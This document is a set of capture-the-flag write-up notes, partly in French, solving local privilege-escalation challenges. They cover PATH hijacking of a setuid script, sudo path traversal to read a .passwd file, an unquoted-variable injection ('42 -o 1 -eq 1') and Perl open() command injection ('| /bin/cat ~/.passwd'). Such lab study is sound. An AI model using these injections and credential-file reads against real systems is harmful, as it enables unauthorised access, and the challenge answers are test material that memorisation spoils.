### Utilisation du PATH

Avec script c u+s

Copy de cat comme ls dans /tmp ou /var/tmp: $ cp /bin/cat /tmp/ls (n'importe quelle commande dont on a besoin cat ou nano ou autre)

modif du PATH dans lequelle les commande vont être exécutée: $ PATH=/tmp

éxecution du script qui va donc utiliser le cat comme ls

### Les dangers de sudo

sudo permet d'exécuter des commandes en tant qu'un autre utilisateur

sudo -l permet de voir quelle commandes peuvent être lancée et par quel utilisateur

sudo -u $user $commande

dans le cas de cette exercice:

```bash 
$ sudo -l
User app-script-ch1 may run the following commands on challenge02:
    (app-script-ch1-cracked) /bin/cat /challenge/app-script/ch1/notes/*

$ sudo -u app-script-ch1-cracked /bin/cat /challenge/app-script/ch1/notes/*

$ sudo -u app-script-ch1-cracked cat /challenge/app-script/ch1/notes/../ch1cracked/.passwd
```

### Unquoted variables

Solution

```
./wrapper "42 -o 1 -eq 1" 
````

Explanation
This condition needs to be passed (line 18):
````
if test $PASS -eq ${1}; then
````

Note that `${1}` is unquoted!
Hence, it will be "split" before being passed to the `test` command.

So, we need:

Something that is an integer to make a valid comparison to $PASS;
A condition that is always true: `1 -eq 1`.
And the condition will be split to become:
````
$PASS -eq 42 -o 1 -eq 1
````

Sources
Split/Glob effect on unquoted variables: https://unix.stackexchange.com/questions/171346/security-implications-of-forgetting-to-quote-a-variable-in-bash-posix-shells#answer-171347;
OR operation for the test command: https://tldp.org/LDP/abs/html/comparison-ops.html#CCOMPARISON1 .


### PERL - Command injection

setuid-wrapper SUID program execute the perl file ch7.pl
so after reading the perl issue article montioned in this challenge .
i found in code only The open() function so i focus on it issues here where the solution appear to me

The Perl documentation tells us that:

   If the filename begins with "|", the filename is interpreted as a command to which output is to be piped, and if the filename ends with a "|", the filename is interpreted as a command which pipes output to us.
so i run
````
./setuid-wrapper
#it run python script as SUID permission
| /bin/cat ~/.passwd
````
et voila

thank you .
